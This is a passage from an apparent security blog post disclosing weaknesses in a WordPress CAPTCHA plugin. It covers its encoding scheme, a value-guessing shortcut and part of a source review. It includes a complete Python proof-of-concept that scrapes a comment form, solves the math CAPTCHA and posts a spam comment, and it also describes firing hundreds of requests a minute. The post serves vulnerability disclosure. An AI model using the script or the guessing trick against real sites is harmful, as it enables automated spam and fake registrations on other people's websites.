Calculation with timestamp: 1383773155 Encoded 9wpu is decoded to 11 
Calculation with timestamp: 1383767071 Encoded ejeX is decoded to 27 
Calculation with timestamp: 1383772116 Encoded dWyu is decoded to 15</p>
</li>
</ul>
<p>What do you see? Numeric captcha solutions (The base64 encoded 3-4
char string) smaller than 10, have a encoded value that ends with
the equal sign "=". Hence we could just sketch a little script that
checks whether the hidden field <code>cptch_result</code> ends with a "=". If
this is the case, we just guess the result! That means we can inject
a spammer comment/login attempt/registration in every 10th case (a
little less effectively since we have to discard numbers &gt; 10 [But
there we could also guess a number, just a higher one, there's
finite pool of them]. Assuming that we fire 500 requests a minute,
we can spam the blog with 50 new users or 50 spam comments a minute!
That's not bad for such a simplistic approach :P<br />
This technique bases, yet again, on the bad encode() function.</p>
<h3>Excursus: Could we crack the new function?</h3>
<p>Let's assume that <code>get_bloginfo( "url" ).time();</code> yields something like</p>
<div class="highlight"><pre>http://site.us1383733573
</pre></div>


<p>Then the pool of random characters is (Every character only once!)</p>
<div class="highlight"><pre>htp:/sie.u13875
</pre></div>


<p>and the number of occurences for every char is:</p>
<div class="highlight"><pre>&#39;h&#39;: 1 
&#39;t&#39;: 3
&#39;p&#39;: 1
&#39;:&#39;: 1
&#39;/&#39;: 2
&#39;s&#39;: 2
&#39;i&#39;: 1
&#39;e&#39;: 1
&#39;.&#39;: 1
&#39;u&#39;: 1
&#39;1&#39;: 1
&#39;3&#39;: 3
&#39;8&#39;: 1
&#39;7&#39;: 2
&#39;5&#39;: 2
</pre></div>


<p>And of course we all know our maths: The number of combinations is n\^k,
where n is the number of different input characters (The alphabet) and k
is the length of the password.</p>
<p>Hence we need to calculate an average of</p>
<div class="highlight"><pre>n = 15;
k = 15;

number_of_combinations = 15^15

Python:
&gt;&gt;&gt; 15**15
437893890380859375
</pre></div>


<p>437893890380859375 is quite a big number. Assuming we have a slow PC and
use <a href="http://hashcat.net/oclhashcat-plus/">hashcat</a>, we can handle 335M
c/s. This means we need 1307145941 seconds to brute force the password.
Of course this "cryptoanalysis" applies only to a somewhat artificial
site url like <em>http://site.us</em>. Nevertheless, this is not secure in terms
of cryptography!</p>
<h3>Excursus: Do we even need to crack the function?</h3>
<p>Due to the implementation of the encode() function, it doesn't matter
how good the password is, since only maximally two bytes of the random
data blob is essentially used in the <em>encrypted</em> value. Just analyze the
encode() function and you will soon realize that every number 0-9 is
xored with a random byte and every number &gt; 10 is xored with two random
bytes...So there is just no need for more than two random bytes :/</p>
<h2>Original blog post</h2>
<h3>Preface (Start of blog post that applies to version 3.8.7)</h3>
<p>Over the years I have seen quite some applications that weren't very
well engineered. Security bugs, cumbersome coding practices and a
missing sense for software architecture to name a few key points. But
there was mostly some reason for the lack of quality. Be it the
inexperience of the authors, the relative novelty of the application or
just laziness. Bad code is not really <em>that bad</em> if it doesn't
compromise the security or usability of the software and does not
jeopardize many users. But apps that compromise both and find themselves
simultaneously in a advanced development stage are really unpleasant to
encounter. (That's my opinion. I think there are also many examples of
my code that lacks security and usability and good coding practices. But
I didn't publish any of my code officially or even distribute it
commercially).</p>
<p>In this blog post I will demonstrate the utter failing of a thousand
line wordpress security plugin that should test to tell computers and
humans apart (CAPTCHA).</p>
<h3>Who is the villain?</h3>
<p><strong>It is <a href="http://wordpress.org/plugins/captcha/">Captcha</a>.</strong></p>
<p>Some basic information about the wordpress plugin (From 03.11.2013):</p>
<table class="table">
<thead>
<tr>
<th>
Affected version

</th>
<th>
Vendor

</th>
<th>
Last Updated

</th>
<th>
Downloads

</th>
<th>
Ratings

</th>
<th>
Downloads yesterday

</th>
</tr>
</thead>
<td>
[3.8.7](http://plugins.svn.wordpress.org/captcha/tags/3.8.7/ "3.8.7")

</td>
<td>
http://bestwebsoft.com/

</td>
<td>
2013-10-31

</td>
<td>
1,187,259

</td>
<td>
4.6 of 5 stars (240 ratings)

</p>
<td>
4,215

</td>
</tr>
</table>

<p>Therefore this plugin is <strong>rather large</strong> and enjoys a ever growing user
base. It is also the very first hit when you type "Captcha" in the
wordpress search form. Maybe because the plugin has the exactly the same
name :/ Anyways, the prominent position is reason enough to investigate
furher.</p>
<p>It's description states euphorically:</p>
<blockquote>
<p>The Captcha plugin allows you to implement a super security captcha
form into web forms. It protects your website from spam by means of
math logic, easily understood by human beings. You will not have to
spend your precious time on annoying attempts to understand
hard-to-read words, combinations of letters or pictures that make your
eyes pop up. All you need is to do one of the three basic maths
actions - add, subtract and multiply. This captcha can be used for
login, registration, password recovery, comments forms.</p>
</blockquote>
<p>That reads very well. Handy math equations, sophisticated protection
from spammers, super security (<a href="http://kryptochef.net/">Cryptochef</a> is
calling)!. No need for hard to decipher captchas! Blame me, I don't
believe it...</p>
<h3>The blackbox approach (Without reading the source)</h3>
<p>How can easy math equations like these</p>
<p><img alt="captcha
1" src="http://s.wordpress.org/plugins/captcha/screenshot-3.jpg?r=798318" /><br />
<img alt="captcha
2" src="http://s.wordpress.org/plugins/captcha/screenshot-4.jpg?r=798318" /><br />
<img alt="3" src="http://s.wordpress.org/plugins/captcha/screenshot-5.jpg?r=798318" /></p>
<p>be immune against common parsing and computational evaluation?</p>
<p>Let's try if we can actually crack them using a little quick &amp; dirty
python script I just coded without even reading the source code further.
You can also investigate my script on my <a href="https://github.com/NikolaiT/Scripts/blob/master/scripts/python/cracking_captcha_plugin/crack.py" title="github account">github
account</a>.
Please note that you have to install the captcha plugin on your
wordpress site and that you need to adjust the links in the script to
point to a existing blog site in order to test that the script solves
the captchas.</p>
<div class="highlight"><pre><span class="c"># Proofs uselessness of popular captcha plugin for wordpress</span>
<span class="c"># Software link: http://wordpress.org/plugins/captcha/</span>

<span class="c"># Modify links to test on your site. You should obviously provide correct URI&#39;s</span>
<span class="c"># and have the plugin installed.</span>

<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">lxml.html</span>
<span class="kn">import</span> <span class="nn">itertools</span>

<span class="n">N</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;zero&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span><span class="s">&#39;one&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span><span class="s">&#39;two&#39;</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span><span class="s">&#39;three&#39;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span><span class="s">&#39;four&#39;</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span><span class="s">&#39;five&#39;</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span><span class="s">&#39;six&#39;</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span><span class="s">&#39;seven&#39;</span><span class="p">:</span> <span class="mi">7</span><span class="p">,</span><span class="s">&#39;eight&#39;</span><span class="p">:</span> <span class="mi">8</span><span class="p">,</span><span class="s">&#39;nine&#39;</span><span class="p">:</span> <span class="mi">9</span><span class="p">,</span><span class="s">&#39;eleven&#39;</span><span class="p">:</span> <span class="mi">11</span><span class="p">,</span><span class="s">&#39;twelve&#39;</span><span class="p">:</span> <span class="mi">12</span><span class="p">,</span><span class="s">&#39;thirteen&#39;</span><span class="p">:</span> <span class="mi">13</span><span class="p">,</span>
<span class="s">&#39;fourteen&#39;</span><span class="p">:</span> <span class="mi">14</span><span class="p">,</span><span class="s">&#39;fifteen&#39;</span><span class="p">:</span> <span class="mi">15</span><span class="p">,</span><span class="s">&#39;sixteen&#39;</span><span class="p">:</span> <span class="mi">16</span><span class="p">,</span><span class="s">&#39;seventeen&#39;</span><span class="p">:</span> <span class="mi">17</span><span class="p">,</span><span class="s">&#39;eighteen&#39;</span><span class="p">:</span> <span class="mi">18</span><span class="p">,</span><span class="s">&#39;nineteen&#39;</span><span class="p">:</span> <span class="mi">19</span><span class="p">,</span> <span class="s">&#39;ten&#39;</span><span class="p">:</span> <span class="mi">10</span><span class="p">,</span><span class="s">&#39;twenty&#39;</span><span class="p">:</span> <span class="mi">20</span><span class="p">,</span><span class="s">&#39;thirty&#39;</span><span class="p">:</span> <span class="mi">30</span><span class="p">,</span>
<span class="s">&#39;forty&#39;</span><span class="p">:</span> <span class="mi">40</span><span class="p">,</span><span class="s">&#39;fifty&#39;</span><span class="p">:</span> <span class="mi">50</span><span class="p">,</span><span class="s">&#39;sixty&#39;</span><span class="p">:</span> <span class="mi">60</span><span class="p">,</span><span class="s">&#39;seventy&#39;</span><span class="p">:</span> <span class="mi">70</span><span class="p">,</span><span class="s">&#39;eighty&#39;</span><span class="p">:</span> <span class="mi">80</span><span class="p">,</span><span class="s">&#39;ninety&#39;</span><span class="p">:</span><span class="mi">90</span><span class="p">}</span>

<span class="n">OPERATORS</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;+&#39;</span><span class="p">:</span> <span class="s">&#39;+&#39;</span><span class="p">,</span> <span class="s">&#39;−&#39;</span><span class="p">:</span> <span class="s">&#39;-&#39;</span><span class="p">,</span> <span class="s">&#39;×&#39;</span><span class="p">:</span> <span class="s">&#39;*&#39;</span><span class="p">,</span> <span class="s">&#39;/&#39;</span><span class="p">:</span> <span class="s">&#39;/&#39;</span><span class="p">,</span> <span class="s">&#39;=&#39;</span><span class="p">:</span> <span class="s">&#39;=&#39;</span><span class="p">}</span>

<span class="k">def</span> <span class="nf">R</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">d</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">d</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
                <span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">))</span>
        <span class="c"># If we can make a sum of the string, try it (For cases like &quot;twenty four&quot;)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">has_op</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="ow">and</span> <span class="s">&#39;y&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
                <span class="n">s</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">sum</span><span class="p">([</span><span class="nb">int</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39; &#39;</span><span class="p">)</span> <span class="k">if</span> <span class="n">n</span> <span class="ow">and</span> <span class="nb">int</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="ow">in</span> <span class="n">N</span><span class="o">.</span><span class="n">values</span><span class="p">()]))</span>
        <span class="k">return</span> <span class="n">s</span>

<span class="c"># Prevent bad words in eval()        </span>
<span class="k">def</span> <span class="nf">whitelist</span><span class="p">(</span><span class="n">captcha</span><span class="p">):</span>
    <span class="n">good</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">itertools</span><span class="o">.</span><span class="n">chain</span><span class="p">(</span><span class="n">N</span><span class="o">.</span><span class="n">keys</span><span class="p">(),</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">N</span><span class="o">.</span><span class="n">values</span><span class="p">()],</span> <span class="n">OPERATORS</span><span class="o">.</span><span class="n">keys</span><span class="p">()))</span>
    <span class="k">for</span> <span class="n">token</span> <span class="ow">in</span> <span class="n">captcha</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39; &#39;</span><span class="p">):</span>
        <span class="n">token</span> <span class="o">=</span> <span class="n">token</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">token</span> <span class="ow">and</span> <span class="n">token</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">good</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">&quot;I failed: [</span><span class="si">%s</span><span class="s">]&quot;</span> <span class="o">%</span> <span class="n">token</span><span class="p">)</span>
            <span class="nb">exit</span><span class="p">(</span><span class="s">&#39;Better not.&#39;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">captcha</span>

<span class="k">def</span> <span class="nf">has_op</span><span class="p">(</span><span class="n">expr</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">o</span> <span class="ow">in</span> <span class="n">OPERATORS</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
                <span class="k">if</span> <span class="n">o</span> <span class="ow">in</span> <span class="n">expr</span><span class="p">:</span>
                        <span class="k">return</span> <span class="bp">True</span>
        <span class="k">return</span> <span class="bp">False</span>

<span class="k">def</span> <span class="nf">get_op</span><span class="p">(</span><span class="n">expr</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">o</span> <span class="ow">in</span> <span class="n">OPERATORS</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
                <span class="k">if</span> <span class="n">o</span> <span class="ow">in</span> <span class="n">expr</span><span class="p">:</span>
                        <span class="k">return</span> <span class="n">o</span>
        <span class="k">return</span> <span class="bp">False</span>

<span class="k">def</span> <span class="nf">solve</span><span class="p">(</span><span class="n">captcha</span><span class="p">):</span>
        <span class="c"># Some example captchas:</span>
        <span class="c"># &#39;9 −  =  eight&#39;</span>
        <span class="c"># &#39;+ 3 =  eight&#39;</span>
        <span class="c"># &#39;9 × one =&#39;</span>
        <span class="c"># &#39;× 8 =  twenty four&#39;</span>
        <span class="c"># We see: Simple mathematical expression consisting of two parts. Let&#39;s parse that.</span>
        <span class="n">left</span><span class="p">,</span> <span class="n">equals</span><span class="p">,</span> <span class="n">right</span> <span class="o">=</span> <span class="n">captcha</span><span class="o">.</span><span class="n">partition</span><span class="p">(</span><span class="s">&#39;=&#39;</span><span class="p">)</span> <span class="c"># Python is beautiful</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">left</span><span class="o">.</span><span class="n">strip</span><span class="p">():</span>
                <span class="n">left</span> <span class="o">=</span> <span class="s">&#39;y&#39;</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">right</span><span class="o">.</span><span class="n">strip</span><span class="p">():</span>
                <span class="n">right</span> <span class="o">=</span> <span class="s">&#39;y&#39;</span>

        <span class="n">left</span> <span class="o">=</span><span class="n">R</span><span class="p">(</span><span class="n">left</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span>
        <span class="n">right</span> <span class="o">=</span> <span class="n">R</span><span class="p">(</span><span class="n">right</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span>

        <span class="n">expr</span> <span class="o">=</span> <span class="p">[</span><span class="n">left</span><span class="p">,</span> <span class="n">right</span><span class="p">][</span><span class="n">has_op</span><span class="p">(</span><span class="n">right</span><span class="p">)]</span> <span class="c"># expr is the part with the mathematical operator</span>

        <span class="n">ll</span><span class="p">,</span> <span class="n">op</span><span class="p">,</span> <span class="n">rr</span> <span class="o">=</span> <span class="n">expr</span><span class="o">.</span><span class="n">partition</span><span class="p">(</span><span class="n">get_op</span><span class="p">(</span><span class="n">expr</span><span class="p">))</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">ll</span><span class="o">.</span><span class="n">strip</span><span class="p">():</span>
                <span class="n">ll</span> <span class="o">=</span> <span class="s">&#39;y&#39;</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">rr</span><span class="o">.</span><span class="n">strip</span><span class="p">():</span>
                <span class="n">rr</span> <span class="o">=</span> <span class="s">&#39;y&#39;</span>

        <span class="c"># Reassemble</span>
        <span class="n">X</span> <span class="o">=</span> <span class="s">&#39;</span><span class="si">%s</span><span class="s"> == </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="s">&#39;</span><span class="si">%s</span><span class="s"> </span><span class="si">%s</span><span class="s"> </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">R</span><span class="p">(</span><span class="n">ll</span><span class="p">,</span> <span class="n">N</span><span class="p">),</span> <span class="n">OPERATORS</span><span class="p">[</span><span class="n">op</span><span class="p">],</span> <span class="n">R</span><span class="p">(</span><span class="n">rr</span><span class="p">,</span> <span class="n">N</span><span class="p">)),</span> <span class="p">[</span><span class="n">right</span><span class="p">,</span> <span class="n">left</span><span class="p">][</span><span class="n">expr</span><span class="o">==</span><span class="n">right</span><span class="p">])</span>

        <span class="c"># Brute force</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10000</span><span class="p">):</span>
                <span class="k">if</span> <span class="nb">eval</span><span class="p">(</span><span class="n">X</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;y&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))):</span>
                        <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
        <span class="c"># Obtain post parameters from comment form</span>

        <span class="k">try</span><span class="p">:</span>
                <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">&#39;http://incolumitas.com/2013/10/16/create-your-own-font-the-hard-way/&#39;</span><span class="p">)</span>
        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">ConnectionError</span> <span class="k">as</span> <span class="n">cerr</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">&#39;Network problem occured&#39;</span><span class="p">)</span>
        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">Timeout</span> <span class="k">as</span> <span class="n">terr</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">&#39;Connection timeout&#39;</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">r</span><span class="o">.</span><span class="n">ok</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">&#39;HTTP Error:&#39;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>

        <span class="c"># Parse parameters and solve captcha</span>

        <span class="n">dom</span> <span class="o">=</span> <span class="n">lxml</span><span class="o">.</span><span class="n">html</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;utf-8&#39;</span><span class="p">))</span>
        <span class="n">el</span> <span class="o">=</span> <span class="n">dom</span><span class="o">.</span><span class="n">find_class</span><span class="p">(</span><span class="s">&#39;cptch_block&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
        <span class="n">captcha</span> <span class="o">=</span> <span class="n">el</span><span class="o">.</span><span class="n">text_content</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
        <span class="n">solution</span> <span class="o">=</span> <span class="n">solve</span><span class="p">(</span><span class="n">whitelist</span><span class="p">(</span><span class="n">captcha</span><span class="p">))</span>

        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">el</span><span class="o">.</span><span class="n">getchildren</span><span class="p">():</span>
                <span class="k">try</span><span class="p">:</span>
                        <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;name&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;cptch_result&#39;</span><span class="p">:</span>
                                <span class="n">result</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;value&#39;</span><span class="p">]</span>
                        <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;name&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;cptch_time&#39;</span><span class="p">:</span>
                                <span class="n">time</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;value&#39;</span><span class="p">]</span>
                <span class="k">except</span> <span class="ne">KeyError</span><span class="p">:</span>
                        <span class="k">pass</span>

        <span class="n">el</span><span class="o">=</span> <span class="n">dom</span><span class="o">.</span><span class="n">find_class</span><span class="p">(</span><span class="s">&#39;form-submit&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">el</span><span class="o">.</span><span class="n">getchildren</span><span class="p">():</span>
                <span class="k">try</span><span class="p">:</span>
                        <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;name&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;comment_post_ID&#39;</span><span class="p">:</span>
                                <span class="n">post_id</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;value&#39;</span><span class="p">]</span>
                        <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;name&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;comment_parent&#39;</span><span class="p">:</span>
                                <span class="n">comment_parent</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;value&#39;</span><span class="p">]</span>
                <span class="k">except</span> <span class="ne">KeyError</span><span class="p">:</span>
                        <span class="k">pass</span>

        <span class="k">print</span><span class="p">(</span><span class="s">&quot;[+] Solution of captcha &#39;</span><span class="si">%s</span><span class="s">&#39; is </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">captcha</span><span class="p">,</span> <span class="n">solution</span><span class="p">))</span>

        <span class="c"># No write a comment with the cracked captcha to proof that we provided the</span>
        <span class="c"># correct solution.</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;author&#39;</span><span class="p">:</span> <span class="s">&#39;spammer&#39;</span><span class="p">,</span> <span class="s">&#39;email&#39;</span><span class="p">:</span> <span class="s">&#39;spammer@spamhouse.org&#39;</span><span class="p">,</span> <span class="s">&#39;url&#39;</span><span class="p">:</span> <span class="s">&#39;http://spamming.com&#39;</span><span class="p">,</span>
        <span class="s">&#39;cptch_result&#39;</span><span class="p">:</span> <span class="n">result</span><span class="p">,</span> <span class="s">&#39;cptch_time&#39;</span><span class="p">:</span> <span class="n">time</span><span class="p">,</span> <span class="s">&#39;cptch_number&#39;</span><span class="p">:</span> <span class="n">solution</span><span class="p">,</span>
        <span class="s">&#39;comment&#39;</span><span class="p">:</span> <span class="s">&quot;Hi there! No protection from spammers!!!:D&quot;</span><span class="p">,</span> <span class="s">&#39;submit&#39;</span><span class="p">:</span> <span class="s">&#39;Post+Comment&#39;</span><span class="p">,</span>
        <span class="s">&#39;comment_post_ID&#39;</span><span class="p">:</span> <span class="n">post_id</span><span class="p">,</span> <span class="s">&#39;comment_parent&#39;</span><span class="p">:</span> <span class="n">comment_parent</span><span class="p">}</span>

        <span class="k">try</span><span class="p">:</span>
                <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">&quot;http://incolumitas.com/wp-comments-post.php&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">ConnectionError</span> <span class="k">as</span> <span class="n">cerr</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">&#39;Network problem occured&#39;</span><span class="p">)</span>
        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">Timeout</span> <span class="k">as</span> <span class="n">terr</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">&#39;Connection timeout&#39;</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">r</span><span class="o">.</span><span class="n">ok</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">&#39;HTTP Error:&#39;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>

        <span class="k">if</span> <span class="s">&#39;&#39;&#39;Error: You have entered an incorrect CAPTCHA value.&#39;&#39;&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">&#39;[-] Captcha cracking was not successful&#39;</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">&#39;[+] Comment submitted&#39;</span><span class="p">)</span>
</pre></div>


<p>That seems to work surprisingly well. Without even reading the code, the
captcha plugin is totally broken using the upper approach. The above
code simply parses every mathematical equation (The plugin always severs
equations) and assembles them to strings the feeds python built-in
eval(). We then iterate the expression from zero to 10000 and substitute
the for loop variable into the expression. If the math expression
becomes true, we found the variable and therefore the solution. Really
easy. Well the plugin is broken, that's proved, but I have this strange
insight that I might be on the track to reveal a twofold broken app :P
(It's 04:00 in the morning here, maybe that's why I am writing so
chesty)</p>
<h3>Whiteboxing - Code assessment</h3>
<p>Let's review the source code of the plugin.</p>
<p>You also want to have a glance on the code?
<a href="http://plugins.svn.wordpress.org/captcha/tags/3.8.7/captcha.php" title="the code">Here</a>
you go.<br />
My very first impression was quite positive (Besides already knowing
that the plugin was useless :/). The author seems to posses a profound
understanding of the wordpress API, he uses lot's of hooks (filters and
actions) and structures the code on the first glimpse very nicely. I
know from own experience that writing code for wordpress is not always
easy. But let's look at the critical part. The captcha is generated by
the function cptch_display_captcha_custom(). For your convenience, I
will list it here:</p>
<div class="highlight"><pre><span class="x">// Functionality of the captcha logic work for custom form</span>
<span class="x">if ( ! function_exists( &#39;cptch_display_captcha_custom&#39; ) ) {</span>
<span class="x">    function cptch_display_captcha_custom() {</span>
<span class="x">        global $cptch_options, $str_key, $cptch_time;</span>
<span class="x">        $content = &quot;&quot;;</span>

<span class="x">        // In letters presentation of numbers 0-9</span>
<span class="x">        $number_string = array(); </span>
<span class="x">        $number_string[0] = __( &#39;zero&#39;, &#39;captcha&#39; );</span>
<span class="x">        $number_string[1] = __( &#39;one&#39;, &#39;captcha&#39; );</span>
<span class="x">        $number_string[2] = __( &#39;two&#39;, &#39;captcha&#39; );</span>
<span class="x">        $number_string[3] = __( &#39;three&#39;, &#39;captcha&#39; );</span>
<span class="x">        $number_string[4] = __( &#39;four&#39;, &#39;captcha&#39; );</span>
<span class="x">        $number_string[5] = __( &#39;five&#39;, &#39;captcha&#39; );</span>
<span class="x">        $number_string[6] = __( &#39;six&#39;, &#39;captcha&#39; );</span>
<span class="x">        $number_string[7] = __( &#39;seven&#39;, &#39;captcha&#39; );</span>
<span class="x">        $number_string[8] = __( &#39;eight&#39;, &#39;captcha&#39; );</span>
<span class="x">        $number_string[9] = __( &#39;nine&#39;, &#39;captcha&#39; ); </span>
<span class="x">        // In letters presentation of numbers 11 -19</span>
<span class="x">        $number_two_string = array();</span>
<span class="x">        $number_two_string[1] = __( &#39;eleven&#39;, &#39;captcha&#39; );</span>
<span class="x">        $number_two_string[2] = __( &#39;twelve&#39;, &#39;captcha&#39; );</span>
<span class="x">        $number_two_string[3] = __( &#39;thirteen&#39;, &#39;captcha&#39; );</span>
<span class="x">        $number_two_string[4] = __( &#39;fourteen&#39;, &#39;captcha&#39; );</span>
<span class="x">        $number_two_string[5] = __( &#39;fifteen&#39;, &#39;captcha&#39; );</span>
<span class="x">        $number_two_string[6] = __( &#39;sixteen&#39;, &#39;captcha&#39; );</span>
<span class="x">        $number_two_string[7] = __( &#39;seventeen&#39;, &#39;captcha&#39; );</span>
<span class="x">        $number_two_string[8] = __( &#39;eighteen&#39;, &#39;captcha&#39; );</span>
<span class="x">        $number_two_string[9] = __( &#39;nineteen&#39;, &#39;captcha&#39; );</span>
<span class="x">        // In letters presentation of numbers 10, 20, 30, 40, 50, 60, 70, 80, 90</span>
<span class="x">        $number_three_string = array();</span>
<span class="x">        $number_three_string[1] = __( &#39;ten&#39;, &#39;captcha&#39; );</span>
<span class="x">        $number_three_string[2] = __( &#39;twenty&#39;, &#39;captcha&#39; );</span>
<span class="x">        $number_three_string[3] = __( &#39;thirty&#39;, &#39;captcha&#39; );</span>
<span class="x">        $number_three_string[4] = __( &#39;forty&#39;, &#39;captcha&#39; );</span>
<span class="x">        $number_three_string[5] = __( &#39;fifty&#39;, &#39;captcha&#39; );</span>
<span class="x">        $number_three_string[6] = __( &#39;sixty&#39;, &#39;captcha&#39; );</span>
<span class="x">        $number_three_string[7] = __( &#39;seventy&#39;, &#39;captcha&#39; );</span>
<span class="x">        $number_three_string[8] = __( &#39;eighty&#39;, &#39;captcha&#39; );</span>
<span class="x">        $number_three_string[9] = __( &#39;ninety&#39;, &#39;captcha&#39; );</span>
<span class="x">        // The array of math actions</span>
<span class="x">        $math_actions = array();</span>

<span class="x">        // If value for Plus on the settings page is set</span>
<span class="x">        if( 1 == $cptch_options[&#39;cptch_math_action_plus&#39;] )</span>
<span class="x">            $math_actions[] = &#39;+&#39;;</span>
<span class="x">        // If value for Minus on the settings page is set</span>
<span class="x">        if( 1 == $cptch_options[&#39;cptch_math_action_minus&#39;] )</span>
<span class="x">            $math_actions[] = &#39;−&#39;;</span>
<span class="x">        // If value for Increase on the settings page is set</span>
<span class="x">        if( 1 == $cptch_options[&#39;cptch_math_action_increase&#39;] )</span>
